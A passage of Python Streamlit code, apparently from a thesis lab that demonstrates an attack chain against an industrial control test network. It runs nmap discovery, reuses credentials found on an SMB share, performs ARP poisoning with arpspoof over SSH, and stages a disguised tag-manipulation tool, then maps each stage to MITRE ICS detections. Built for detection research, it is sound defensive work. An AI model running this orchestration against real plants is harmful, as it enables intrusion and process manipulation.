                    "Editable command used when you click Run Step",
                    key=step_command_key,
                    height=120,
                )

                if step.title == "Discovery of Level 3 services":
                    st.caption("Step 2 uses a fixed quick scan command for demo stability.")

                if step.title == "ARP MITM":
                    st.caption("arpspoof is a dsniff tool that performs ARP poisoning to position the attacker between two hosts (adversary-in-the-middle).")
                    st.info("Step 7 ARP before/after now runs from historian over SSH (corrupted victim view), which is the correct vantage point for your demo.")
                    st.markdown("Recommended Step 5 sequence")
                    s1, s2 = st.columns(2)
                    if s1.button("Step 7A: List interfaces", key=f"step{step.idx}_list_ifaces", disabled=running):
                        rc_if, out_if = run_remote_capture('cmd /c "C:\\Users\\john\\Downloads\\arpspoof.exe --list"', 30, use_pty=True)
                        st.session_state.buffers[step_key] = (
                            st.session_state.buffers.get(step_key, "")
                            + "\n$ ssh john@192.168.1.5 \"C:\\Users\\john\\Downloads\\arpspoof.exe --list\"\n\n"
                            + out_if
                            + f"\n\n[exit code: {rc_if}]\n"
                        )
                    if s2.button("Step 7B: ARP -n before", key=f"step{step.idx}_arp_before_seq", disabled=running):
                        capture_arp_before()
                        st.session_state.buffers[step_key] = st.session_state.buffers.get(step_key, "") + "\n$ arp -n (before)\n\n" + st.session_state.arp_before + "\n"

                    manual_mitm_key = f"step{step.idx}_manual_command"
                    if manual_mitm_key not in st.session_state:
                        st.session_state[manual_mitm_key] = build_arpspoof_display(
                            st.session_state.arpspoof_path,
                            st.session_state.arpspoof_iface,
                            st.session_state.arpspoof_target_1,
                            st.session_state.arpspoof_target_2,
                        )
                    st.text_area(
                        "Editable manual EWS command for Step 7",
                        key=manual_mitm_key,
                        height=90,
                        help="Use this if you want to run a custom MITM command directly on the EWS.",
                    )

                    b1, b2, b3 = st.columns(3)
                    if b1.button("Step 7C: Run MITM", key=f"run_{step.idx}", disabled=running):
                        start_mitm(step.idx)
                    if b2.button("Stop MITM", key=f"stop_{step.idx}", disabled=running):
                        stop_mitm(step.idx)
                    if b3.button("Run manual command", key=f"manual_run_{step.idx}", disabled=running):
                        rc_manual, out_manual = execute_command(
                            st.session_state.get(manual_mitm_key, ""),
                            "ews",
                            45,
                            use_pty=True,
                        )
                        set_command_result(step_key, st.session_state.get(manual_mitm_key, ""), out_manual, rc_manual)

                    if st.button("Check MITM on EWS", key=f"check_{step.idx}", disabled=running):
                        check_remote_mitm_status(step.idx)

                    ab1, ab2 = st.columns(2)
                    if ab1.button("Step 7D: ARP -n after", key=f"arp_after_{step.idx}", disabled=running):
                        capture_arp_after()
                        st.session_state.buffers[step_key] = st.session_state.buffers.get(step_key, "") + "\n$ arp -n (after)\n\n" + st.session_state.arp_after + "\n"
                        st.session_state.evidence_out[step.idx] = collect_mitm_evidence()
                    if ab2.button("Capture MITM evidence now", key=f"mitm_evidence_{step.idx}", disabled=running):
                        st.session_state.evidence_out[step.idx] = collect_mitm_evidence()

                    if st.session_state.arp_before:
                        st.markdown("ARP snapshot before MITM")
                        st.code(st.session_state.arp_before, language="bash")
                    if st.session_state.arp_after:
                        st.markdown("ARP snapshot after MITM")
                        st.code(st.session_state.arp_after, language="bash")

                    if st.session_state.mitm_running:
                        st.success("MITM status: running")
                    else:
                        st.info("MITM status: stopped")
                else:
                    rb1, rb2 = st.columns(2)
                    if rb1.button(f"Run Step {step.idx}", key=f"run_{step.idx}", disabled=running):
                        start_step(step, command_override=st.session_state.get(step_command_key, step.command_exec))
                    if rb2.button(f"Reset Step {step.idx}", key=f"reset_{step.idx}", disabled=running):
                        st.session_state[step_command_key] = step.command_exec
                        st.rerun()

                if step.title == "Tag manipulation":
                    if st.button("Show staged tool template", key="show_manip_script", disabled=running):
                        rc_script, out_script = 0, load_manipulation_payload()
                        st.session_state.buffers[step_key] = (
                            st.session_state.buffers.get(step_key, "")
                            + f"\n$ local payload template: {MANIPULATE_TEMPLATE_PATH}\n\n{out_script}\n\n[exit code: {rc_script}]\n"
                        )

                if running:
                    st.warning("Command running...")
                rc = st.session_state.last_exit.get(step_key)
                if rc is not None:
                    if rc == 0:
                        st.success(f"Last exit code: {rc}")
                    else:
                        st.error(f"Last exit code: {rc}")

                if st.button(f"Show evidence after Step {step.idx}", key=f"evidence_{step.idx}"):
                    run_evidence_bundle(step.idx)
                if step.idx in st.session_state.evidence_out:
                    st.code(st.session_state.evidence_out[step.idx], language="bash")

                render_output(step_key)

        st.subheader("3) Attack Variant Library")
        st.caption("Use these to generate more diverse correlated sessions for the thesis without changing the main 8-step demo chain.")
        variants = variant_definitions(
            st.session_state.smb_target,
            st.session_state.historian_host,
            st.session_state.opcua_endpoint,
        )

        for variant in variants:
            variant_key = f"variant_{variant.key}"
            running = st.session_state.running.get(variant_key, False)
            with st.expander(f"{variant.title} ({variant.mitre})", expanded=False):
                st.info(variant.description)
                st.markdown("Expected detections")
                if variant.expected_rules:
                    st.code(", ".join(variant.expected_rules), language="text")
                st.markdown("Command preview")
                st.code(variant.command_display, language="bash" if variant.exec_mode == "local" else "powershell")

                variant_command_key = f"variant_command_{variant.key}"
                if variant_command_key not in st.session_state:
                    st.session_state[variant_command_key] = variant.command_exec
                st.text_area(
                    "Editable command used when you click Run Variant",
                    key=variant_command_key,
                    height=120,
                )

                vb1, vb2, vb3 = st.columns(3)
                if vb1.button("Run Variant", key=f"run_variant_{variant.key}", disabled=running):
                    start_variant(variant, command_override=st.session_state.get(variant_command_key, variant.command_exec))
                if vb2.button("Reset Variant", key=f"reset_variant_{variant.key}", disabled=running):
                    st.session_state[variant_command_key] = variant.command_exec
                    st.rerun()
                if vb3.button("Show Variant Evidence", key=f"evidence_variant_{variant.key}", disabled=running):
                    run_variant_evidence_bundle(variant_key)

                if running:
                    st.warning("Variant command running...")
                rc = st.session_state.last_exit.get(variant_key)
                if rc is not None:
                    if rc == 0:
                        st.success(f"Last exit code: {rc}")
                    else:
                        st.error(f"Last exit code: {rc}")

                if variant_key in st.session_state.evidence_out:
                    st.code(st.session_state.evidence_out[variant_key], language="bash")

                render_output(variant_key)

    with col_b:
        st.subheader("Demo Script")
        st.markdown(
            """
1. Initial foothold at Level 3.5 jump path (narrative + local host context).
2. Discover Level 3 services with nmap scan.
3. Access anonymous SMB Operations share and read credential-adjacent files.
4. Use discovered john/Cisco to pivot into EWS via SSH or RDP.
5. Access historian history endpoint from EWS context.
6. Probe OPC UA reachability from EWS context.
7. Execute ARP MITM from EWS and verify ARP cache indicators.
8. Stage and run the disguised OT telemetry sync tool from EWS and show the payload template for explanation.
9. Correlate detections in Grafana/Loki/Wazuh evidence panels.
            """.strip()
        )

        st.subheader("MITRE Mapping")
        st.table(
            [
                {"Step": 1, "Technique": "T0846", "Meaning": "Discovery/enumeration"},
                {"Step": 2, "Technique": "T0811", "Meaning": "Repository collection (SMB)"},
                {"Step": 3, "Technique": "T0802", "Meaning": "Historian access/collection"},
                {"Step": 4, "Technique": "T0861", "Meaning": "Direct OPC UA interaction"},
                {"Step": 5, "Technique": "T0830", "Meaning": "Adversary-in-the-middle"},
                {"Step": 6, "Technique": "T0831", "Meaning": "Manipulate process values"},
            ]
        )

        st.subheader("Variant Sessions")
        st.markdown(
            """
- Failed SSH guessing then success: noisy auth attempts followed by a valid pivot.
- PowerShell recon on EWS: host discovery and script-block activity.
- Deeper SMB collection: broader file enumeration and staged collection.
- Historian-heavy collection: repeated process-tag retrieval from EWS context.
- Critical OPC UA write-like session: OT impact-oriented traffic against a sensitive tag.
            """.strip()
        )

        st.subheader("Grafana Switch")
        st.markdown(f"Open dashboard after each attack stage: [SOC Dashboard]({st.session_state.grafana_url})")

        st.subheader("Detection Evidence")
        if st.button("Refresh MITRE evidence", use_container_width=True):
            rows = []
            errors = []
            rule_map: List[Tuple[str, str, str]] = [
                ("100202", "T0802", "Historian history query event"),
                ("100301", "T0822/T0886", "Web/remote access path"),
                ("100302", "T0811", "SMB repository access"),
                ("100303", "T0861", "OPC UA interaction"),
                ("100304", "T0830", "Write-like MITM candidate"),
                ("100305", "T0830", "Critical write-like event"),
                ("100401", "T0021", "RDP session on EWS endpoint"),
                ("100402", "T0021", "SSH session on EWS endpoint"),
                ("100403", "T0059", "Suspicious process execution on EWS"),
                ("100209", "T0831", "Process anomaly / integrity impact"),
            ]
            for rid, mitre, desc in rule_map:
                try:
                    count = int(fetch_rule_count(st.session_state.loki_url, rid, st.session_state.lookback))
                    rows.append({"Rule": rid, "MITRE": mitre, "Meaning": desc, "Count": count})
                except Exception as exc:
                    errors.append(f"{rid}: {exc}")
            if rows:
                st.dataframe(rows, use_container_width=True, hide_index=True)
            if errors:
                st.warning("; ".join(errors))

        st.subheader("Notes")
        st.info("Use controlled lab targets only. Keep one dashboard tab open for stable queries.")
        st.warning("If RDP is DOWN, power on EWS VM/host, ensure Remote Desktop is enabled, and keep Windows firewall RDP rule active.")


if __name__ == "__main__":
    main()
